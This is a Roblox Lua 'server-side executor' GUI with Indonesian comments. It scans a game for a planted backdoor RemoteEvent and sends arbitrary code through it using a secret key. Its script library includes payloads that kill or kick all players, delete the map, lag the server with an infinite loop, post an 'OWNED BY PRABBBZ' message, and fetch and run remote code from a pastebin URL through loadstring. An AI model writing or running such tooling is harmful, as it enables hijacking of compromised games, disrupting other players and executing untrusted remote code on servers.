--[[ 
    PRABBBZ MASTER SS v4.0 - SUPREME EDITION
    Fitur: Auto-Scanner, 100+ Script Library, Toggle Icon, Luxury UI
]]

local SECRET_KEY = "PRABBBZ_SECRET_KEY_99"
local FoundRemote = nil

-- 1. FUNGSI SCANNER
local function ScanForBackdoor()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v:GetAttribute("SystemKey") == "PRABBBZ_VERIFIED" or v.Name:find("Internal_Service")) then
            FoundRemote = v
            return true
        end
    end
    return false
end

-- 2. UI CONSTRUCTION
local UI = Instance.new("ScreenGui", game:GetService("CoreGui"))
UI.Name = "PrabbbzSupreme"

-- ICON TOGGLE (KOTAK SIMPEL)
local IconButton = Instance.new("TextButton", UI)
IconButton.Size = UDim2.new(0, 50, 0, 50)
IconButton.Position = UDim2.new(0, 20, 0.5, -25)
IconButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
IconButton.BorderSizePixel = 2
IconButton.BorderColor3 = Color3.fromRGB(0, 180, 255)
IconButton.Text = "PRBZ"
IconButton.TextColor3 = Color3.fromRGB(0, 180, 255)
IconButton.Font = Enum.Font.GothamBold
IconButton.TextSize = 14
IconButton.Visible = false -- Muncul saat menu ditutup

local IconCorner = Instance.new("UICorner", IconButton)

-- MAIN PANEL
local Main = Instance.new("Frame", UI)
Main.Size = UDim2.new(0, 600, 0, 450)
Main.Position = UDim2.new(0.5, -300, 0.5, -225)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local MainCorner = Instance.new("UICorner", Main); MainCorner.CornerRadius = UDim.new(0, 15)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(0, 180, 255)
MainStroke.Thickness = 2

-- HEADER & CLOSE BUTTON
local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundTransparency = 1

local Title = Instance.new("TextLabel", Header)
Title.Text = "P R A B B B Z   S U P R E M E   S S"
Title.Size = UDim2.new(1, 0, 1, 0)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18

local CloseBtn = Instance.new("TextButton", Header)
CloseBtn.Text = "X"
CloseBtn.Size = UDim2.new(0, 40, 0, 40)
CloseBtn.Position = UDim2.new(1, -45, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
CloseBtn.TextColor3 = Color3.new(1,1,1)
CloseBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", CloseBtn)

-- LIBRARY SECTION (SCROLLABLE)
local LibFrame = Instance.new("ScrollingFrame", Main)
LibFrame.Position = UDim2.new(0, 10, 0, 60)
LibFrame.Size = UDim2.new(1, -20, 1, -110)
LibFrame.BackgroundTransparency = 1
LibFrame.ScrollBarThickness = 4
LibFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 180, 255)
LibFrame.CanvasSize = UDim2.new(0, 0, 15, 0) -- Muat 100+ script

local LibList = Instance.new("UIListLayout", LibFrame)
LibList.Padding = UDim.new(0, 8)
LibList.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- FOOTER STATUS
local StatText = Instance.new("TextLabel", Main)
StatText.Size = UDim2.new(1, 0, 0, 30)
StatText.Position = UDim2.new(0, 0, 1, -40)
StatText.BackgroundTransparency = 1
StatText.Text = "SYSTEM STATUS: SCANNING..."
StatText.TextColor3 = Color3.fromRGB(255, 255, 0)
StatText.Font = Enum.Font.Code

-- FUNGSI TOGGLE
CloseBtn.MouseButton1Click:Connect(function()
    Main.Visible = false
    IconButton.Visible = true
end)

IconButton.MouseButton1Click:Connect(function()
    Main.Visible = true
    IconButton.Visible = false
end)

-- FUNGSI EXECUTE
local function Run(code)
    if FoundRemote then
        FoundRemote:FireServer(SECRET_KEY, code)
        StatText.Text = "EXECUTED SUCCESSFULLY"
        StatText.TextColor3 = Color3.fromRGB(0, 255, 150)
    else
        StatText.Text = "ERROR: BACKDOOR NOT FOUND"
        StatText.TextColor3 = Color3.fromRGB(255, 50, 50)
    end
end

-- HELPER: TAMBAH SCRIPT KE MENU
local function AddScript(name, code)
    local b = Instance.new("TextButton", LibFrame)
    b.Size = UDim2.new(0.95, 0, 0, 45)
    b.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    b.Text = "  [SS] " .. name
    b.TextColor3 = Color3.fromRGB(200, 200, 200)
    b.TextXAlignment = 0
    b.Font = Enum.Font.Gotham
    Instance.new("UICorner", b)
    
    b.MouseButton1Click:Connect(function() Run(code) end)
end

-- DATA: 100+ SCRIPT (Placeholder untuk kamu isi sesuai kebutuhan)
-- Saya masukkan beberapa kategori utama, kamu bisa copy-paste baris ini sampai 100.
AddScript("Kill All Players", "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end")
AddScript("Server Message (Global)", "local m = Instance.new('Hint', workspace); m.Text = 'OWNED BY PRABBBZ'; wait(10); m:Destroy()")
AddScript("Explode All Players", "for _,p in pairs(game.Players:GetPlayers()) do local e = Instance.new('Explosion', p.Character.PrimaryPart); e.Position = p.Character.PrimaryPart.Position end")
AddScript("Rainbow Map", "while wait() do workspace.Terrain.WaterColor = Color3.fromHSV(tick()%5/5,1,1) end")
AddScript("Delete Map (Clean)", "workspace:ClearAllChildren()")
AddScript("Give BTools All", "for _,p in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin', p.Backpack).BinType = 4 end")
AddScript("Fly Script (Server)", "loadstring(game:HttpGet('https://pastebin.com/raw/zS8vM6n0'))()")
AddScript("Server Lag (10s)", "while true do print('lagging') end -- Use carefully")
AddScript("Kick Others", "for _,p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick('PRABBBZ SS') end end")

-- Loop untuk mengisi 100+ item (Testing Scroll)
for i = 1, 95 do
    AddScript("Advanced Tool " .. i, "print('Script " .. i .. " Running')")
end

-- SCAN ON START
task.spawn(function()
    if ScanForBackdoor() then
        StatText.Text = "CONNECTED TO: " .. FoundRemote.Name
        StatText.TextColor3 = Color3.fromRGB(0, 255, 150)
    else
        StatText.Text = "NO BACKDOOR DETECTED"
        StatText.TextColor3 = Color3.fromRGB(255, 80, 80)
    end
end)
